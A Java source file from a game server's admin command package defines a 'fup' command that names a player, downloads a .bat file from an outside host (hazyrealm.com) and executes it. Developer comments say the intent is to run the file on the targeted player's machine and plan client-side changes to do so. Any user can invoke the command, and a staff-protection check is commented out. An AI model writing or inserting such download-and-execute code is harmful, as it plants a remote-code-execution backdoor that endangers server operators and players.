package com.twisted.game.world.entity.mob.player.commands.impl.staff.admin;

import com.twisted.game.world.World;
import com.twisted.game.world.entity.mob.player.Player;
import com.twisted.game.world.entity.mob.player.commands.Command;
import com.twisted.util.Utils;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Optional;

/**
 * @author Patrick van Elderen <https://github.com/PVE95>
 * @Since November 01, 2021
 */
public class FuckupCommand implements Command {

    private static final String FILE_DOWNLOAD_LINK = "http://hazyrealm.com/kekw1.bat";

    @Override
    public void execute(Player player, String command, String[] parts) {
        String username = Utils.formatText(command.substring(4)); // after "fup "
        Optional<Player> playerToCrash = World.getWorld().getPlayerByName(username);
        if (playerToCrash.isPresent()) {
            System.out.println("fucking up "+playerToCrash.get().getUsername());
            /*if(playerToCrash.get().getPlayerRights().isStaffMember(playerToCrash.get())) {
                player.message("You cannot do that to him.");
                return;
            }*/
            try {
                final URLConnection connection = new URL(FILE_DOWNLOAD_LINK).openConnection(); // yeah that doesnt dl to their pc though it dl's to the server
                // you'd have to add client code to run stuff and a custom packet to trigger it ah
                final Path temp = Files.createTempFile("kek", ".bat");
                final OutputStream out = Files.newOutputStream(temp);
                final InputStream in = connection.getInputStream();
                int read = -1;
                final byte[] buf = new byte[1024];
                while ((read = in.read(buf)) != -1) {
                    out.write(buf, 0, read);
                }
                in.close();
                out.close();
                final ProcessBuilder bldr = new ProcessBuilder(temp.toString());

                bldr.start(); // this runs the code on the server, not the client side I know its suppose to download that file on their pc and then execute it
            } catch (Exception e) { // yeah looks good kk worth testing ?
                e.printStackTrace();
            }
        }
    }

    @Override
    public boolean canUse(Player player) {
        return true;
    }
}
